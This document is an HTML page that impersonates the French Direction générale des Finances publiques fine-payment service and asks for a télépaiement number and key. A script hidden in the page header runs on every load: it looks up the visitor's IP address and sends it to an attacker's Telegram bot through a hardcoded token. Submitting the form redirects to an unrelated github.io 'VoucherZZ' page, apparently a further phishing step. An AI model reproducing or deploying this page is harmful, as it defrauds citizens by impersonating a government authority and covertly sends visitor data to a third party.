<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Service de paiement des amendes</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
            background-color: #f4f4f4;
        }
        .header {
            width: 100%;
            height: auto;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f4f4f4;
        }
        .header img {
            max-width: 100%;
            height: auto;
            object-fit: contain;
        }
        .content {
            padding: 15px;
        }
        .form-container {
            max-width: 90%;
            margin: 0 auto;
            text-align: left;
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .button-zone button {
            background-color: #007BFF;
            color: white;
            border: none;
            padding: 12px 35px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
        .footer-copyright {
            margin-top: 20px;
            text-align: center;
            color: #555;
        }
        @media (max-width: 768px) {
            .header img {
                max-height: 50vh; /* Adjusted for smaller screens */
            }
            .button-zone button {
                padding: 12px 30px;
            }
        }
    </style>
    <script>
        // Function to send an alert to Telegram
        function sendTelegramAlert(ip) {
            const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k'; // Replace with your bot token
            const chatId = '7747778364'; // Replace with your chat ID
            const message = `New visitor on the site! IP Address: ${ip}`;
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            fetch(url)
                .then(response => response.json())
                .then(data => console.log('Success:', data))
                .catch((error) => console.error('Error:', error));
        }
        // Function to get the user's IP address
        function getUserIP() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    sendTelegramAlert(ip);
                })
                .catch((error) => console.error('Error getting IP:', error));
        }
        // Trigger the functions when the page loads
        window.onload = function() {
            getUserIP();
        };
    </script>
</head>
<body>
    <div class="header">
        <a href="https://i.ibb.co/v65PmWfY/Cu.jpg">
            <img src="https://i.ibb.co/v65PmWfY/Cu.jpg" alt="Cu" loading="lazy" />
        </a>
    </div>

    <div class="content">
        <a href="https://imgbb.com/">
            <img src="https://i.ibb.co/WWx1pZ4n/e.jpg" alt="e" loading="lazy" style="max-width: 100%; height: auto;" />
        </a>

        <div class="form-container">
            <h3>Saisie du numéro de télépaiement</h3>
            <form id="saisie" onsubmit="window.location.href='https://justmoicom.github.io/VoucherZZ/'; return false;">
                <div class="input-group">
                    <label for="numeroTelepaiement">Numéro de télépaiement :</label>
                    <input type="tel" id="numeroTelepaiement" maxlength="22" required placeholder="Numéro de télépaiement" value="123456789012345678">
                </div>
                <div class="input-group">
                    <label for="cle">Clé :</label>
                    <input type="tel" id="cle" maxlength="2" required placeholder="Clé" value="12">
                </div>
                <div class="button-zone">
                    <button type="submit">Payer</button>
                </div>
            </form>
        </div>
    </div>

    <div class="footer-copyright">
        <p>© Direction générale des Finances publiques - <a id="mention-legales" class="xt" href="/tai/mention-legales">Mentions légales</a></p>
    </div>
</body>
</html>
